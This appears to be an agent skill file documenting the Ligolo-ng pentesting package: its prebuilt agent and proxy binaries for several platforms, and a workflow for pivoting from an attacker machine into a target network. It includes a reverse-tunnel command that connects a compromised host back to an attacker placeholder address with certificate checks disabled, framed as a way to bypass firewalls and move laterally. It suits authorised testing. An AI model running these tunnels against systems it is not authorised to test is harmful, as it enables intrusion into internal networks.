---
name: ligolo-ng-common-binaries
description: Access prebuilt binaries for Ligolo-ng, an advanced tunneling tool that establishes reverse TCP/TLS connections using TUN interfaces. Use when performing network pivoting, lateral movement, or bypassing firewalls during penetration testing without relying on SOCKS proxies.
---

# ligolo-ng-common-binaries

## Overview
Ligolo-ng is a high-performance tunneling tool designed for pentesters. It allows for the creation of a reverse TCP/TLS connection that exposes a TUN interface on the controller, enabling seamless IP-level routing into a target network. This package provides prebuilt agent and proxy binaries for multiple operating systems (Linux, Windows, macOS) and architectures (amd64, arm64). Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
The binaries are stored in a shared directory. If the package is missing:

```bash
sudo apt update && sudo apt install ligolo-ng-common-binaries
```

## Common Workflows

### Locating Binaries
To find the appropriate binary for your target or local machine, list the contents of the shared directory:
```bash
ls -l /usr/share/ligolo-ng-common-binaries/
```

### Setting up a Pivot (Linux Attacker to Windows Target)
1. **On Attacker (Proxy):**
   Copy the Linux proxy to your working directory and run it:
   ```bash
   cp /usr/share/ligolo-ng-common-binaries/ligolo-ng_proxy_0.8.2_linux_amd64 ./proxy
   chmod +x proxy
   ./proxy -selfcert
   ```
2. **On Target (Agent):**
   Transfer the Windows agent and connect back:
   ```cmd
   agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
   ```

### Preparing a TUN Interface (Attacker)
Before starting the proxy, you usually need to set up a TUN interface on your Kali machine:
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

## Complete Command Reference

The `ligolo-ng-common-binaries` package acts as a repository for the following files located in `/usr/share/ligolo-ng-common-binaries/`:

### Agent Binaries
Used on the compromised target machine to connect back to the attacker.

| Binary Name | OS | Architecture |
|-------------|----|--------------|
| `ligolo-ng_agent_0.8.2_darwin_amd64` | macOS | x86_64 |
| `ligolo-ng_agent_0.8.2_darwin_arm64` | macOS | ARM64 |
| `ligolo-ng_agent_0.8.2_linux_amd64` | Linux | x86_64 |
| `ligolo-ng_agent_0.8.2_linux_arm64` | Linux | ARM64 |
| `ligolo-ng_agent_0.8.2_windows_amd64.exe` | Windows | x86_64 |
| `ligolo-ng_agent_0.8.2_windows_arm64.exe` | Windows | ARM64 |

### Proxy Binaries
Used on the attacker's machine to receive connections and manage the TUN interface.

| Binary Name | OS | Architecture |
|-------------|----|--------------|
| `ligolo-ng_proxy_0.8.2_darwin_amd64` | macOS | x86_64 |
| `ligolo-ng_proxy_0.8.2_darwin_arm64` | macOS | ARM64 |
| `ligolo-ng_proxy_0.8.2_linux_amd64` | Linux | x86_64 |
| `ligolo-ng_proxy_0.8.2_linux_arm64` | Linux | ARM64 |
| `ligolo-ng_proxy_0.8.2_windows_amd64.exe` | Windows | x86_64 |
| `ligolo-ng_proxy_0.8.2_windows_arm64.exe` | Windows | ARM64 |

## Notes
- **Pivoting Advantage**: Unlike SOCKS proxies, Ligolo-ng creates a TUN interface, allowing you to use standard tools (nmap, crackmapexec, etc.) against the internal network without `proxychains`.
- **Certificates**: Use the `-selfcert` flag on the proxy for quick setups, and `-ignore-cert` on the agent to bypass verification.
- **Permissions**: Running the proxy and managing TUN interfaces requires `sudo` or specific capabilities on Linux.